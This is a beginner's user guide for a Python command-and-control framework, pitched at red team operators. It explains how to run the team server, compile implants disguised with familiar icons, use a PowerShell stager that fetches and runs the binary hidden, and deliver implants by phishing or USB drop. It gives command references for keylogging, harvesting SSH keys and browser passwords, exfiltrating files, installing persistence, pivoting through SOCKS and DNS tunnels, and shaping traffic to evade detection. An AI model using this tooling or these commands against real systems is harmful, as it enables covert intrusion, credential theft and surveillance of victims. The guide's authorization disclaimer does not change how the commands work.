# C2 Tool — User Guide for Beginner Red Team Researchers

> **DISCLAIMER**: This tool is for authorized penetration testing and educational
> purposes only. Unauthorized access to computer systems is illegal. Always obtain
> written authorization before using this tool against any target.

---

## Table of Contents

1. [What Is This Tool?](#1-what-is-this-tool)
2. [Prerequisites](#2-prerequisites)
3. [Installation](#3-installation)
4. [Project Structure](#4-project-structure)
5. [Configuration](#5-configuration)
6. [Starting the Team Server](#6-starting-the-team-server)
7. [Generating and Deploying the Implant](#7-generating-and-deploying-the-implant)
8. [Basic Operations — Your First Session](#8-basic-operations--your-first-session)
9. [Command Reference](#9-command-reference)
10. [Advanced Features](#10-advanced-features)
11. [Malleable C2 Profiles (Traffic Shaping)](#11-malleable-c2-profiles-traffic-shaping)
12. [Mutual TLS (mTLS)](#12-mutual-tls-mtls)
13. [Troubleshooting](#13-troubleshooting)
14. [Security Hygiene](#14-security-hygiene)

---

## 1. What Is This Tool?

This is a modular Command-and-Control (C2) framework. In red team operations, a C2
framework has two components:

- **Team Server** — The machine you (the operator) control. It listens for callbacks
  from compromised hosts and sends commands to them.
- **Implant (Client)** — The lightweight agent that runs on the target machine. It
  periodically "beacons" (calls home) to the team server to check for commands,
  executes them, and returns the output.

Communication happens over HTTP (or HTTPS with mTLS) and all data is encrypted with
Fernet (AES-128-CBC) symmetric encryption.

---

## 2. Prerequisites

### Skills You Should Have

- Basic Linux command-line usage (navigating directories, running scripts)
- Basic understanding of networking (IP addresses, ports, HTTP requests)
- Basic Python knowledge (you don't need to be a developer, but you should understand
  how to install packages and run scripts)
- Understanding of red team methodology (reconnaissance, initial access, post-exploitation)

### Software Requirements

| Requirement        | Why                                                |
|--------------------|----------------------------------------------------|
| Python 3.10+       | The framework is written in Python                 |
| pip                | To install Python dependencies                     |
| Git                | To clone the repository                            |
| PyInstaller        | Only needed if you want to compile the implant     |
| openssl            | Only needed if you want to use mTLS                |

### Python Packages (installed via requirements.txt)

```
cryptography    — Fernet encryption
pyzipper        — AES-encrypted ZIP files
requests        — HTTP client
inputimeout     — Timed input for keep-alive
PyYAML          — YAML configuration parsing
websockets      — WebSocket transport (optional)
aiohttp         — Multi-operator async server (optional)
```

---

## 3. Installation

### Step 1: Clone or Copy the Project

```bash
git clone <repository-url> c2_tool
cd c2_tool
```

### Step 2: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 3 (Optional): Install PyInstaller for Payload Compilation

```bash
pip install pyinstaller
```

This is only needed if you plan to generate compiled binary implants (EXE files).
For testing, you can run the Python client directly.

### Step 4: Verify the Installation

```bash
python run_server.py --help
```

If this runs without errors, your environment is ready.

---

## 4. Project Structure

```
c2_tool/
├── config/
│   ├── default.yaml          <-- Main configuration file
│   ├── config.py             <-- Config loader
│   ├── profile_handler.py    <-- Malleable profile engine
│   └── profiles/             <-- Traffic-shaping profiles
│       ├── jquery_cdn.yaml
│       └── amazon_cdn.yaml
│
├── c2/
│   ├── server/               <-- Team server code
│   ├── client/               <-- Implant code
│   ├── transport/            <-- mTLS, SOCKS proxy, WebSocket
│   ├── modules/              <-- Post-exploitation modules
│   ├── crypto/               <-- Encryption
│   └── logging/              <-- SQLite activity log
│
├── payloads/
│   └── generator.py          <-- Payload compiler
│
├── run_server.py             <-- START THE SERVER WITH THIS
├── run_client.py             <-- START THE CLIENT WITH THIS (for testing)
├── generate_payload.py       <-- Generate compiled implant
└── requirements.txt
```

---

## 5. Configuration

All settings live in `config/default.yaml`. Before your first run, you MUST change
at least the encryption key and the server address.

### Step 1: Copy the Default Config

```bash
cp config/default.yaml config.yaml
```

Now edit `config.yaml` (or just use `config/default.yaml` directly — the loader
falls back to it if no `config.yaml` exists).

### Step 2: Change the Encryption Key

```yaml
encryption:
  key: "MySecretKey2024!"          # <-- CHANGE THIS
  zip_password: "ZipP@ss2024!"     # <-- CHANGE THIS (for encrypted ZIPs)
```

**Important**: The key is padded to 32 bytes with the character 'P', then base64
encoded and used as a Fernet key. Both server and implant MUST use the same key.

### Step 3: Set the Server Address

```yaml
network:
  port: 80
  bind_address: ""           # "" means listen on all interfaces
  c2_server: "10.0.0.5"      # <-- YOUR team server IP (or "localhost" for testing)
```

- `bind_address`: The IP/interface the server binds to. Use `""` for all interfaces.
- `c2_server`: The IP or hostname the implant connects to. Must be reachable from
  the target machine.

### Step 4: Adjust Beacon Timing

```yaml
beacon:
  sleep_seconds: 60           # Base sleep between callbacks
  jitter_percent: 20          # Random variation (±20%)
```

With sleep=60 and jitter=20, the implant will beacon every 48–72 seconds.
Higher sleep = less network traffic but slower command response.
Higher jitter = harder to detect via periodic-traffic analysis.

### Step 5: Set the Logging Database

```yaml
logging:
  enabled: true
  database: "c2_activity.db"   # SQLite file storing all sessions/commands/events
```

Activity logging records every session connection, command sent, and output received.
Useful for writing reports after an engagement.

---

## 6. Starting the Team Server

```bash
python run_server.py
```

Or with a custom config file:

```bash
python run_server.py config.yaml
```

Or via environment variable:

```bash
C2_CONFIG=config.yaml python run_server.py
```

You will see:

```
C2 server listening on 0.0.0.0:80
Activity logging to c2_activity.db
operator@server:~$
```

The server prompt shows: `<account>@<hostname>:<cwd>$`
- Before any implant connects: `operator@server:~$`
- After connecting: `<user>@<target-hostname>:<cwd>$`

### Server-Side Commands

These are typed directly at the server prompt:

| Command        | Description                                      |
|----------------|--------------------------------------------------|
| `sessions`     | List all connected implants with their session IDs |
| `use <id>`     | Switch to a specific implant session              |
| Anything else  | Queued as a command for the active implant        |

---

## 7. Generating and Deploying the Implant

You have two options for running the implant:

### Option A: Run as Python Script (for testing/lab use)

Copy the entire project folder to the target machine. On the target:

```bash
python run_client.py
```

Or with a custom config:

```bash
python run_client.py config.yaml
```

Or use the environment variable:

```bash
C2_CONFIG=config.yaml python run_client.py
```

### Option B: Compile to Standalone Binary (for real engagements)

On your team server (or build machine):

```bash
python generate_payload.py -f exe -o agent
```

Arguments:

| Flag              | Description                              | Default      |
|-------------------|------------------------------------------|--------------|
| `-f, --format`    | Output format: `exe`, `onefile`, `onedir`| `exe`        |
| `-o, --output`    | Output filename                          | `c2_client`  |
| `-i, --icon`      | Path to icon file (for disguise)         | None         |
| `-c, --config`    | Config file path                         | auto-detect  |
| `--ps-shellcode`  | Generate PowerShell stager instead       | false        |

Examples:

```bash
# Basic EXE
python generate_payload.py -f exe -o updater

# With custom icon
python generate_payload.py -f exe -o updater -i icons/notepad.ico

# PowerShell stager (downloads and executes the EXE)
python generate_payload.py --ps-shellcode -o stager
```

The PowerShell stager generates a `.ps1` file that downloads the compiled binary
from the team server and executes it hidden. You need to host the EXE yourself
(e.g., on a web server).

### Delivering the Implant

Common delivery methods (in authorized engagements):

1. **Phishing email** — Attach the EXE or link to it
2. **USB drop** — Place on a USB drive left in the target environment
3. **Exploitation** — Deploy via a vulnerability exploit
4. **Direct access** — If you already have shell access, transfer via SCP/HTTP

---

## 8. Basic Operations — Your First Session

### Scenario: Lab Environment (localhost testing)

**Terminal 1 — Start the server:**

```bash
python run_server.py
```

Output:
```
C2 server listening on 0.0.0.0:80
operator@server:~$
```

**Terminal 2 — Start the client (simulates the target):**

```bash
python run_client.py
```

**Back in Terminal 1 — You should see the session register:**

```
operator@server:~$ sessions
  1: testuser@my-laptop@1717286400.0 *
```

### Sending Your First Command

Now type a shell command — it will be queued and delivered on the next beacon:

```
operator@server:~$ whoami
```

After the implant's next beacon cycle (default: 48–72 seconds), you'll see output:

```
testuser
```

### Working with Multiple Sessions

```
operator@server:~$ sessions
  1: alice@workstation-01@1717286400.0 *
  2: bob@server-dc01@1717286500.0

operator@server:~$ use 2
Switched to session 2

bob@server-dc01:~$ hostname
```

The `*` marks your currently active session.

---

## 9. Command Reference

### Shell Commands (no prefix)

Any text that does NOT start with `client` or `cd` is executed as a shell command
on the target:

```
whoami              # Run whoami on target
ipconfig /all       # Windows network config
ifconfig            # Linux network config
cat /etc/passwd     # Read file on Linux target
dir C:\Users        # List directory on Windows target
```

### Directory Navigation

```
cd /tmp             # Change directory on target
cd C:\Users\Admin   # Windows path
```

The server prompt updates to show the current working directory on the target.

### Implant Commands (all prefixed with `client`)

#### File Transfer

```
client download /etc/shadow       # Download file FROM server TO implant
client upload /home/user/docs.zip # Upload file FROM implant TO server
```

- **download**: The file must exist on the team server. It gets sent to the implant's
  current working directory.
- **upload**: The file must exist on the implant. It gets saved to the `incoming/`
  directory on the team server.

#### File Encryption

```
client zip /home/user/secrets.txt     # AES-encrypt a file into .zip
client unzip /home/user/secrets.txt.zip  # Decrypt and extract
```

Uses the `zip_password` from your config. Useful for exfiltrating sensitive data
with an extra layer of encryption.

#### Implant Control

```
client sleep 300     # Make implant sleep for 300 seconds (5 minutes)
client kill          # Terminate the implant process
```

**Warning**: `client kill` is permanent. The implant will exit and you lose access
to that host unless you have another persistence mechanism.

#### Persistent Shell (PTY) — Linux/macOS Only

A regular shell command runs in a non-interactive subprocess (no environment, no
shell built-ins like `source` or `alias`). PTY mode gives you a full interactive
shell session:

```
client pty start              # Start interactive PTY shell
client pty whoami             # Run command in PTY
client pty sudo -l            # Run sudo (works in PTY, not in basic shell)
client pty vim /etc/hosts     # Interactive editors work in PTY
client pty close              # Close the PTY session
```

**When to use PTY**: Anytime you need interactive programs (vim, top, sudo, su,
mysql client, etc.) or shell features like aliases and environment variables.

#### Persistence

Keep access to the target even after reboot:

```
client persist cron       # Add a cron job (Linux)
client persist systemd    # Create a systemd service (Linux, needs root)
client persist registry   # Add to Windows Registry Run key
client persist task       # Create a Windows Scheduled Task
```

**Warning**: Persistence mechanisms survive reboots. Make sure you clean up after
authorized engagements. Always document what you installed.

#### SOCKS5 Proxy (Pivoting)

Turn the implant into a SOCKS5 proxy to route traffic through the target:

```
client socks start 1080    # Start SOCKS5 proxy on port 1080
client socks stop          # Stop the proxy
```

After starting, configure your tools (Proxychains, nmap, etc.) to use the implant's
IP:1080 as a SOCKS5 proxy. This lets you scan and access internal networks that are
only reachable from the compromised host.

Example with Proxychains:

```bash
# In /etc/proxychains.conf, add:
socks5 <implant-ip> 1080

# Then:
proxychains nmap -sT -Pn 10.10.10.0/24
```

#### Port Scanning

Scan internal hosts from the implant:

```
client scan 192.168.1.0/24               # Scan default ports on subnet
client scan 10.0.0.1 80,443,8080,3389    # Specific ports
client scan 172.16.0.5 1-1024 2          # Port range with 2s timeout
```

#### Screenshot Capture

```
client screenshot                  # Auto-detect save path
client screenshot /tmp/screen.png  # Specify save path
```

Cross-platform: uses GDI on Windows, `screencapture` on macOS, `scrot` on Linux.

#### Keylogger

```
client keylog start      # Start logging keystrokes
client keylog status     # Check if keylogger is running
client keylog dump       # Retrieve captured keystrokes
client keylog stop       # Stop logging
```

Platform-specific:
- Windows: GetAsyncKeyState polling
- Linux: Reads from `/dev/input/event*` (may need root)
- macOS: Uses `pynput` (needs Accessibility permissions)

#### Credential Harvesting

```
client credharvest all       # Try all methods
client credharvest ssh       # SSH private keys
client credharvest chrome    # Chrome/Edge saved passwords
client credharvest history   # Shell history (bash, zsh)
client credharvest wifi      # Saved WiFi passwords
```

#### Reverse Port Forwarding

Expose a remote service through the implant to your team server:

```
client rportfwd create 1 8888 10.0.0.100 3389   # Forward local:8888 -> remote:3389
client rportfwd list                              # Show active tunnels
client rportfwd remove 1                          # Close tunnel #1
```

Use case: Access an internal RDP server (10.0.0.100:3389) by connecting to
the implant's port 8888 through the reverse tunnel.

#### P2P Pivot Chaining

Chain implants together so that deeply nested hosts beacon through intermediate hops:

```
client p2p create_pivot jump01 10.0.0.5 4444   # Create pivot node
client p2p create_leaf leaf01 10.0.0.5 4444    # Connect leaf to pivot
```

The pivot implant relays traffic between the team server and leaf implants.

#### DNS Tunnel

Covert channel over DNS TXT records:

```
client dns server start example.com mykey      # Start DNS tunnel server
client dns client query example.com mykey sid1 "data here"  # Client query
```

Requires DNS delegation of the tunnel domain to the implant host.

#### Multi-Operator Server

Run an async server that supports multiple operators simultaneously:

```
client multiop server start 0.0.0.0 9090       # Start multi-op server
client multiop operator create alice            # Create operator with token
```

Operators authenticate with tokens stored in `operators.db`.

#### Generic Module Execution

```
client module portscan 192.168.1.1 80,443      # Run portscan module directly
client module <name> [args...]                  # Run any module from c2/modules/
```

---

## 10. Advanced Features

### Environment Variable Overrides

Set these to change behavior without editing config files:

| Variable      | Purpose                                |
|---------------|----------------------------------------|
| `C2_CONFIG`   | Path to config file                    |
| `C2_PROFILE`  | Name of malleable profile to use       |

```bash
C2_PROFILE=jquery_cdn python run_server.py
```

### Keep-Alive for Long Idle Connections

If you're running the server behind a cloud load balancer (Azure, AWS) that
kills idle connections after ~4 minutes, configure:

```yaml
server:
  input_timeout: 240          # Timeout in seconds
  keep_alive_cmd: "date +%R"  # Command sent on timeout (Linux)
  # keep_alive_cmd: "time /T" # For Windows targets
```

### Custom HTTP Paths

Change the default beacon paths to avoid signature-based detection:

```yaml
http:
  cmd_request_path: "/api/v2/check?id="
  file_request_path: "/static/assets?file="
  file_upload_path: "/api/v2/upload"
  response_path: "/api/v2/report"
  cwd_response_path: "/api/v2/status"
  user_agent: "MyCustomAgent/1.0"
```

### Using an HTTP Proxy

If the implant needs to egress through a corporate proxy:

```yaml
http:
  proxy: "http://proxy.corp.local:8080"
```

---

## 11. Malleable C2 Profiles (Traffic Shaping)

Profiles make your C2 traffic look like legitimate web traffic (e.g., jQuery CDN
requests, Amazon API calls). This helps evade network monitoring and IDS/IPS rules.

### Activating a Profile

In `config/default.yaml`:

```yaml
profile: jquery_cdn    # or "amazon_cdn"
```

Or via environment variable:

```bash
C2_PROFILE=jquery_cdn python run_server.py
```

### What Profiles Change

1. **URI paths** — Instead of `/book?isbn=...`, traffic uses
   `/ajax/libs/jquery/3.7.1/jquery.min.js?v=abc123`
2. **Headers** — User-Agent, Accept, Accept-Language, Referer are set to look like
   a real browser requesting CDN assets
3. **Rotation** — User-Agent, Accept-Language, and Referer rotate randomly from a
   list so traffic doesn't fingerprint to a single browser
4. **Random suffixes** — Every request gets a `?v=randomstring` appended to look
   like cache-busting

### Built-in Profiles

- **jquery_cdn** — Mimics cdnjs.cloudflare.com jQuery requests
- **amazon_cdn** — Mimics Amazon API/CDN traffic

### Creating Custom Profiles

Create a YAML file in `config/profiles/`:

```yaml
profile:
  name: "my_custom_profile"
  description: "Mimics internal corporate API"

http:
  request:
    uri_pattern: "/api/v3/healthcheck"
    uri_random_suffix: true
    method: GET
    headers:
      User-Agent: "CorpApp/2.1"
      Accept: "application/json"
    user_agent_rotation:
      enabled: true
      list:
        - "CorpApp/2.1"
        - "CorpApp/2.0"
        - "CorpApp/1.9"

  response:
    uri_pattern: "/api/v3/events"
    method: POST
    headers:
      Content-Type: "application/json"
    post_key: "events"

  file_request:
    uri_pattern: "/api/v3/assets"
    uri_random_suffix: true
    method: GET
    headers:
      Accept: "*/*"

  file_upload:
    uri_pattern: "/api/v3/upload"
    method: PUT
    headers:
      Content-Type: "application/octet-stream"

  cwd_response:
    uri_pattern: "/api/v3/status"
    method: POST
    headers:
      Content-Type: "application/json"
    post_key: "status"
```

---

## 12. Mutual TLS (mTLS)

For encrypted transport with certificate pinning (the network traffic itself is
TLS-encrypted, not just the payload data).

### Step 1: Generate Certificates

You need `openssl` installed. Generate a CA, server cert, and client cert:

```bash
# Generate CA
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 365 -key ca.key -out ca.crt -subj "/CN=C2-CA"

# Generate server cert
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr -subj "/CN=c2server.local"
openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out server.crt

# Generate client cert
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr -subj "/CN=c2client"
openssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out client.crt
```

### Step 2: Configure mTLS

```yaml
mtls:
  enabled: true
  ca_cert: "ca.crt"
  ca_key: "ca.key"
  server_cert: "server.crt"
  server_key: "server.key"
  client_cert: "client.crt"
  client_key: "client.key"
  pinned_server_fingerprint: "SHA256_FINGERPRINT_HERE"
```

Get the fingerprint:

```bash
openssl x509 -in server.crt -noout -fingerprint -sha256
```

### Step 3: Distribute Certificates

- Server needs: `ca.crt`, `server.crt`, `server.key`
- Implant needs: `ca.crt`, `client.crt`, `client.key`

Both sides verify each other's certificate against the CA, preventing MITM attacks.

---

## 13. Troubleshooting

### "Connection refused" when implant tries to beacon

- Check the server is running: `python run_server.py`
- Check the port matches in config (default: 80)
- Check firewall rules: `sudo ufw allow 80/tcp` or `iptables -L`
- Check `c2_server` in config points to the correct IP

### Implant connects but commands show no output

- The beacon interval is 60s ± 20% by default. Wait at least 90 seconds.
- Lower the beacon time for testing: `sleep_seconds: 5`, `jitter_percent: 10`
- Check that both server and implant use the same encryption key

### "InvalidToken" decryption errors

- The encryption key in config doesn't match between server and implant
- Ensure you're using the same `config.yaml` (or same key values) on both sides

### PyInstaller build fails

- Make sure PyInstaller is installed: `pip install pyinstaller`
- Try building with verbose output to see the error
- Some modules require hidden imports — add them to the `hidden_imports` config list

### Keylogger returns nothing

- **Linux**: Needs root or `input` group membership to read `/dev/input/event*`
- **macOS**: Needs Accessibility permissions in System Preferences > Security
- **Windows**: Should work out of the box with GetAsyncKeyState

### Port scan returns no results

- The implant must have network connectivity to the target hosts
- TCP connect scans require the implant to reach the target ports
- Check local firewall rules on the implant host

### SOCKS proxy can't reach internal hosts

- The implant must have network access to the target segment
- Use `client socks start` on an implant that's on the internal network
- Configure Proxychains or your tool to point to `<implant-ip>:1080`

### Server shows no prompt / hangs

- If `input_timeout` is set and `keep_alive_cmd` is configured, the server auto-sends
  the keep-alive command on timeout. If not, it continues the loop.
- Try `Ctrl+C` to restart cleanly.

---

## 14. Security Hygiene

### Before the Engagement

1. **Change all default keys** — The default encryption key ("YOUR KEY") is public
2. **Change default paths** — Default HTTP paths (`/book`, `/author`, etc.) are
   fingerprintable
3. **Use a malleable profile** — Makes traffic look legitimate
4. **Set appropriate beacon timing** — Fast beacons (= 5s) are loud; slow beacons
   (= 300s) are stealthy but slow to respond

### During the Engagement

1. **Log everything** — Activity logging helps with report writing
2. **Don't persist on production servers** — Unless specifically authorized
3. **Clean up uploaded files** — The `incoming/` directory stores exfiltrated data

### After the Engagement

1. **Kill all implants** — `client kill` on every active session
2. **Remove persistence** — Manually remove cron jobs, systemd services, registry
   keys, scheduled tasks you installed
3. **Secure the activity database** — `c2_activity.db` contains all captured output
4. **Delete certificate files** — If you generated them, clean up `.crt` and `.key`
5. **Rotate all passwords** — Any passwords used during testing should be changed

### Files to Never Commit to Git

```
config.yaml            # Contains your real keys
*.crt, *.key           # Certificates
c2_activity.db         # Engagement data
operators.db           # Operator tokens
incoming/              # Exfiltrated files
temp.py                # Scratch files
packages.microsoft.gpg # Stray files
```

Add these to your `.gitignore`.

---

## Quick Start Cheat Sheet

```bash
# 1. Install
pip install -r requirements.txt

# 2. Configure
cp config/default.yaml config.yaml
# Edit config.yaml: set encryption.key, network.c2_server, network.port

# 3. Start server
python run_server.py

# 4. Test: start client in another terminal
python run_client.py

# 5. On the server prompt:
sessions                # See connected implants
whoami                  # Run command on active implant
cd /tmp                 # Navigate on implant
client upload secret.txt  # Exfil a file

# 6. For production: compile the implant
pip install pyinstaller
python generate_payload.py -f exe -o agent

# 7. After engagement: clean up
client kill             # On each session
```
